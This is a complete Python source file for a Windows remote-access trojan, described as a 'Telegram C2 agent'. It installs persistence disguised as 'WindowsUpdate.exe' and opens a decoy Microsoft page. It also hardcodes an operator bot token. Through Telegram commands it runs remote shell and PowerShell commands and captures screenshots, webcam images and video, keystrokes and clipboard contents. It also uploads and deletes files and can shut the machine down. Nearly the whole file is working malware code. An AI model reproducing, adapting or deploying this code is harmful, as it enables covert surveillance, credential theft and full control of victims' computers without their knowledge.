#!/usr/bin/env python3
# =============================================================================
# TELEGRAM C2 AGENT – FINAL SINGLE‑PC VERSION
#   - No emoji in runtime logs (plain ASCII) => no garbled characters
#   - Clean agent ID: HOSTNAME/Username (domain stripped)
#   - Persistence with detailed error reporting
#   - All commands: shell, powershell, screenshot, webcam, video, keylogger,
#     clipboard, download, delete, view, die, off
#   - Fast, real‑time polling, self‑healing 10s retry loop
# =============================================================================
import cv2
import time
import telebot
import platform
import pyautogui
import subprocess
import threading
from pynput import keyboard
import os
import re
import json
import socket
import psutil
from datetime import datetime
from uuid import getnode as get_mac
import sys
import base64
import io
import traceback
import webbrowser
import shutil
import winreg
from pathlib import Path

# -----------------------------------------------------------------------------
# Hardcoded Configuration (your real credentials)
# -----------------------------------------------------------------------------
BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
TELEGRAM_USER_ID = 5178265082

# Optional keylogger bot – leave empty if not used
KEYLOGGER_BOT_API_KEY = ""
KEYLOGGER_CHAT_ID = ""

# Decoy URL (Microsoft documentation)
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Global log buffer (sent to Telegram before decoy URL)
# -----------------------------------------------------------------------------
log_lines = []

def log(msg):
    """Append a timestamped message to the runtime log (ASCII only)."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_lines.append(f"[{timestamp}] {msg}")
    print(f"[*] {msg}")

def send_log_to_telegram(bot_instance):
    """Upload the entire runtime log as Execution_log.txt to the operator."""
    if not log_lines:
        return
    try:
        log_text = "\n".join(log_lines)
        bio = io.BytesIO(log_text.encode('utf-8'))
        bio.name = "Execution_log.txt"
        bio.seek(0)
        bot_instance.send_document(TELEGRAM_USER_ID, bio)
        log("Log file sent to Telegram")
    except Exception as e:
        print(f"[!] Failed to send log: {e}")

# -----------------------------------------------------------------------------
# Telegram bot instances
# -----------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_API_KEY)
keylogger_bot = telebot.TeleBot(KEYLOGGER_BOT_API_KEY) if KEYLOGGER_BOT_API_KEY else None

# -----------------------------------------------------------------------------
# Agent identification (writable location)
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)

# -----------------------------------------------------------------------------
# Persistence (Registry + Startup folder)
# -----------------------------------------------------------------------------
def install_persistence():
    """Copy self to AppData and set Registry Run key + Startup folder."""
    try:
        dest_dir = Path(agents_dir)
        dest_path = dest_dir / 'WindowsUpdate.exe'
        current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)

        # Copy only if not already there
        if current.resolve() != dest_path.resolve():
            shutil.copy2(current, dest_path)

        # Registry Run key (HKCU)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r'Software\Microsoft\Windows\CurrentVersion\Run',
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, str(dest_path))
        winreg.CloseKey(key)

        # Startup folder backup
        startup = Path(appdata) / r'Microsoft\Windows\Start Menu\Programs\Startup'
        shutil.copy2(current, startup / 'WindowsUpdate.exe')
        return True
    except Exception as e:
        log(f"Persistence error: {traceback.format_exc()}")
        return False

# -----------------------------------------------------------------------------
# Keylogger (all original functions – emojis replaced with ASCII)
# -----------------------------------------------------------------------------
keylogger_active = False
keylogger_listener = None
keystroke_buffer = ""
MAX_BUFFER_LENGTH = 100
last_send_time = time.time()
SEND_INTERVAL = 60

def on_press(key):
    global keystroke_buffer, last_send_time
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystroke_buffer += key.char
        elif key == keyboard.Key.space:
            keystroke_buffer += " "
        elif key == keyboard.Key.enter:
            keystroke_buffer += "\n"
        elif key == keyboard.Key.tab:
            keystroke_buffer += "\t"
        else:
            keystroke_buffer += f"[{str(key).replace('Key.', '')}]"
    except AttributeError:
        keystroke_buffer += f"[{str(key)}]"

    current_time = time.time()
    if (len(keystroke_buffer) >= MAX_BUFFER_LENGTH or
            (current_time - last_send_time >= SEND_INTERVAL and keystroke_buffer)):
        send_keystrokes()

def send_keystrokes():
    global keystroke_buffer, last_send_time
    if keystroke_buffer and keylogger_bot:
        try:
            system_id = get_system_id()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"Keylogger data from: {system_id}\nTime: {timestamp}\n\n{keystroke_buffer}"
            keylogger_bot.send_message(KEYLOGGER_CHAT_ID, message)
            keystroke_buffer = ""
            last_send_time = time.time()
        except Exception as e:
            print(f"[!] Error sending keystrokes: {e}")

def start_keylogger():
    global keylogger_active, keylogger_listener
    if keylogger_active:
        return "Keylogger is already running"
    if not keylogger_bot:
        return "Keylogger bot not configured"
    try:
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()
        keylogger_active = True
        def periodic_send():
            while keylogger_active:
                time.sleep(SEND_INTERVAL)
                send_keystrokes()
        threading.Thread(target=periodic_send, daemon=True).start()
        log("Keylogger started")
        return "Keylogger started successfully"
    except Exception as e:
        return f"Failed to start keylogger: {str(e)}"

def stop_keylogger():
    global keylogger_active, keylogger_listener, keystroke_buffer
    if not keylogger_active:
        return "Keylogger is not running"
    keylogger_active = False
    if keylogger_listener:
        keylogger_listener.stop()
    if keystroke_buffer:
        send_keystrokes()
    log("Keylogger stopped")
    return "Keylogger stopped successfully"

# Keylog cleaning utilities (unchanged)
def apply_backspaces(s):
    pattern = re.compile(r'\[backspace\]', flags=re.IGNORECASE)
    parts = pattern.split(s)
    out = parts[0]
    for seg in parts[1:]:
        if out:
            out = out[:-1]
        out += seg
    return out

def process_special_keys(text):
    text = re.sub(r'\[shift\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[ctrl\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[alt\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[win\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[caps_lock\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[enter\]', '\n', text, flags=re.IGNORECASE)
    text = re.sub(r'\[tab\]', '\t', text, flags=re.IGNORECASE)
    text = re.sub(r'\[space\]', ' ', text, flags=re.IGNORECASE)
    text = re.sub(r'\[left\]', '[<-]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[right\]', '[->]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[up\]', '[Up]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[down\]', '[Down]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[esc\]', '[Esc]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[delete\]', '[Del]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[backspace\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[insert\]', '[Ins]', text, flags=re.IGNORECASE)
    return text

def clean_keylogger_data(text):
    text = apply_backspaces(text)
    text = process_special_keys(text)
    return text

def clean_keylog_file(input_file, output_file):
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            raw_text = f.read()
        cleaned_text = clean_keylogger_data(raw_text)
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(cleaned_text)
        log(f"Cleaned keylog file {input_file} -> {output_file}")
        return f"Successfully cleaned keylog file. Output written to {output_file}"
    except Exception as e:
        return f"Error cleaning file: {str(e)}"

# -----------------------------------------------------------------------------
# System identification (clean agent ID)
# -----------------------------------------------------------------------------
def get_system_id():
    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
    # Strip domain prefix if present (e.g., "DESKTOP-XXX\user" -> "user")
    if '\\' in raw_user:
        username = raw_user.split('\\', 1)[1]
    else:
        username = raw_user
    return f"{hostname}/{username}"

def verify_telegram_id(uid):
    return TELEGRAM_USER_ID == uid

def execute_system_command(cmd):
    try:
        output = subprocess.getstatusoutput(cmd)[1]
        return output[:4000] if len(output) > 4000 else output
    except Exception as e:
        return f"Error: {e}"

def execute_powershell(cmd):
    try:
        output = subprocess.getstatusoutput(f"powershell -Command {cmd}")[1]
        return output[:4000] if len(output) > 4000 else output
    except Exception as e:
        return f"Error: {e}"

def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except ImportError:
        return "Clipboard access requires pywin32"
    except Exception as e:
        return f"Clipboard error: {e}"

# -----------------------------------------------------------------------------
# Multimedia capture (screenshot, webcam, video)
# -----------------------------------------------------------------------------
def take_screenshot():
    try:
        img = pyautogui.screenshot()
        filename = f"{int(time.time())}.png"
        img.save(filename)
        return filename, None
    except Exception as e:
        return None, str(e)

def take_webcam_photo():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            filename = f"{int(time.time())}.png"
            cv2.imwrite(filename, frame)
            cap.release()
            return filename, None
        cap.release()
        return None, "Webcam not accessible"
    except Exception as e:
        return None, str(e)

def record_video(duration):
    try:
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"{int(time.time())}.avi"
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start = time.time()
        while time.time() - start < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        out.release()
        cap.release()
        return filename, None
    except Exception as e:
        return None, str(e)

# -----------------------------------------------------------------------------
# File operations
# -----------------------------------------------------------------------------
def view_file_content(path):
    try:
        if not os.path.exists(path):
            return f"File not found: {path}"
        if os.path.isdir(path):
            return "Path is a directory, not a file"
        file_size = os.path.getsize(path)
        if file_size > 10 * 1024 * 1024:
            return f"File too large to view ({file_size/1024/1024:.1f} MB)"
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        if len(content) > 4000:
            content = content[:4000] + "\n... (truncated)"
        return content
    except Exception as e:
        return f"Error: {e}"

def download_file(path):
    if not os.path.exists(path):
        return None, f"File not found: {path}"
    if os.path.isdir(path):
        return None, "Path is a directory"
    if os.path.getsize(path) > 50 * 1024 * 1024:
        return None, "File too large (>50 MB)"
    return path, None

# -----------------------------------------------------------------------------
# Command dispatcher
# -----------------------------------------------------------------------------
def execute_command(full_cmd):
    parts = full_cmd.strip().split(' ', 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd in ("ping", "start", "scan"):
        return f"{get_system_id()} online\n{platform.system()} {platform.release()}", None

    if cmd in ("shell", "cmd"):
        if not args:
            return "Usage: shell <command>", None
        return execute_system_command(args), None

    if cmd in ("powershell", "pow"):
        if not args:
            return "Usage: powershell <command>", None
        return execute_powershell(args), None

    if cmd == "screenshot":
        path, err = take_screenshot()
        return (f"Screenshot captured", path) if path else (f"Error: {err}", None)

    if cmd == "webcam":
        path, err = take_webcam_photo()
        return (f"Webcam photo captured", path) if path else (f"Error: {err}", None)

    if cmd == "video":
        try:
            dur = int(args)
        except:
            return "Usage: video <seconds>", None
        path, err = record_video(dur)
        return (f"Video ({dur}s) recorded", path) if path else (f"Error: {err}", None)

    if cmd in ("clipboard", "clip"):
        return get_clipboard(), None

    if cmd in ("download", "downloadfile"):
        filepath = args.strip()
        if not os.path.exists(filepath):
            return f"File not found: {filepath}", None
        return f"Uploading {filepath}", filepath

    if cmd == "delete":
        filepath = args.strip()
        try:
            os.remove(filepath)
            return f"Deleted: {filepath}", None
        except Exception as e:
            return f"Delete failed: {e}", None

    if cmd in ("view", "viewfile"):
        return view_file_content(args.strip()), None

    if cmd == "keylogger":
        sub = args.strip().lower()
        if sub == "start":
            return start_keylogger(), None
        if sub == "stop":
            return stop_keylogger(), None
        if sub == "status":
            return f"Keylogger is {'active' if keylogger_active else 'inactive'}", None
        parts = sub.split()
        if len(parts) >= 3 and parts[0] == "clean":
            return clean_keylog_file(parts[1], parts[2]), None
        return "Usage: keylogger <start|stop|status|clean input output>", None

    if cmd == "die":
        log("Die command received")
        return "Shutting down...", None

    if cmd == "off":
        try:
            subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=True)
        except Exception as e:
            return f"Shutdown failed: {e}", None
        return "Shutting down PC...", None

    return f"Unknown command: {cmd}", None

# -----------------------------------------------------------------------------
# Telegram bot handlers
# -----------------------------------------------------------------------------
def generic_handler(message):
    if not verify_telegram_id(message.from_user.id):
        return
    text = message.text
    if text.startswith('/'):
        text = text[1:]

    output, file_path = execute_command(text)

    safe = f"```\n{output}\n```"
    bot.reply_to(message, safe, parse_mode=None)

    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as f:
                if file_path.endswith(('.png', '.jpg', '.jpeg')):
                    bot.send_photo(message.chat.id, f)
                elif file_path.endswith('.avi'):
                    bot.send_video(message.chat.id, f)
                else:
                    bot.send_document(message.chat.id, f)
        except Exception as e:
            log(f"File send error: {e}")
            bot.reply_to(message, f"Error sending file: {e}")
        finally:
            try:
                os.remove(file_path)
            except:
                pass

    if text.startswith("die"):
        os._exit(0)

COMMANDS = [
    'start', 'scan', 'ping', 'shell', 'cmd', 'powershell', 'pow',
    'screenshot', 'webcam', 'video', 'clipboard', 'clip', 'download',
    'downloadfile', 'delete', 'view', 'viewfile', 'keylogger', 'die', 'off'
]
for cmd in COMMANDS:
    bot.message_handler(commands=[cmd])(generic_handler)

# -----------------------------------------------------------------------------
# Cleanup & main loop
# -----------------------------------------------------------------------------
def cleanup():
    if keylogger_active and keystroke_buffer:
        send_keystrokes()

if __name__ == "__main__":
    log("Agent starting")
    # Persistence
    if not install_persistence():
        log("Persistence installation failed. Check permissions.")
    else:
        log("Persistence installed")

    agent_id = get_system_id()
    log(f"Agent ID: {agent_id}")

    send_log_to_telegram(bot)

    webbrowser.open(DECOY_URL)

    log("Entering main polling loop")
    while True:
        try:
            bot.polling(none_stop=True, timeout=30)
        except Exception as e:
            log(f"Polling error: {e}. Retrying in 10s...")
            time.sleep(10)
